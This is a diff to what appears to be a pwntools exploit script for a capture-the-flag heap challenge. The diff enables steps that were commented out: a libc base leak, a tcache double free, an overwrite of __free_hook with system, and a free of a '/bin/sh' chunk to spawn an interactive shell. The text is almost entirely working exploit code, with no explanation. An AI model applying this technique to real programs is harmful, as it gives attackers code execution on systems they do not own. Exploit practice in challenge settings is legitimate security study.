@@ -63,21 +63,21 @@ print('free leak: ', hex(free_addr))
 libc.address = free_addr - libc.sym['free']
 print('Libc base: ', hex(libc.address))
 
-#editStudent(p64(libc.sym['free']))
+editStudent(p64(libc.sym['free']))
 
-#deleteAdmin()
+deleteAdmin()
 
-#newUser(b'A'*8)
-#deleteUser()
-#deleteUser()
+newUser(b'A'*8)
+deleteUser()
+deleteUser()
 
-#editStudent(p64(libc.sym['__free_hook']))
+editStudent(p64(libc.sym['__free_hook']))
 
-#newUser(b'A'*8)
-#newUser(p64(libc.sym['system']))
+newUser(b'A'*8)
+newUser(p64(libc.sym['system']))
 
-#newUser(b'/bin/sh\x00')
+newUser(b'/bin/sh\x00')
 
-#deleteUser()
+deleteUser()
 
 r.interactive()
